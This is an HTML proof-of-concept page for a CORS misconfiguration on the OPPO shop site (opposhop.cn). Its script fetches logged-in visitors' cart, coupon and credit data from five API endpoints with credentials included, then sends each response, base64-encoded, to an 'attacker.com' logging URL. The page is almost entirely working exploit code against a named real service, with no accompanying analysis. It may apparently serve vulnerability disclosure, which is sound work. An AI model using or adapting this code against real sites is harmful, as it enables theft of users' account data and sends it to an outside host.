<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>OPPO CORS PoC</title>
</head>

<body>

<h2>OPPO CORS Exploit Proof of Concept</h2>
<button onclick="run()">Run Exploit</button>

<pre id="output">Loading...</pre>

<script>
function encodeData(str) {
    return btoa(unescape(encodeURIComponent(str)));
}

function exfiltrate(label, data) {
    try {
        var img = new Image();
        img.src = "https://attacker.com/log?d=" + encodeData(label + ":" + data);
    } catch(e) {
        console.log("Exfil error:", e);
    }
}

function fetchData(url, label) {
    fetch(url, {
        credentials: "include"
    })
    .then(r => r.text())
    .then(data => {
        document.getElementById("output").innerText += "\n\n### " + label + "\n" + data;
        exfiltrate(label, data);
    })
    .catch(err => {
        document.getElementById("output").innerText += "\n\n### " + label + "\nError: " + err;
    });
}

function run() {

    document.getElementById("output").innerText = "";

    fetchData("https://www.opposhop.cn/cn/oapi/orders/web/cart/v1/list", "cart");

    fetchData("https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount", "count");

    fetchData("https://www.opposhop.cn/cn/oapi/users/web/coupons/count?state=1", "coupons");

    fetchData("https://www.opposhop.cn/cn/oapi/users/web/credits/getUserCredit", "credit");

    fetchData("https://www.opposhop.cn/cn/oapi/credits/web/credits/show", "credits_new");
}
</script>

</body>
</html>
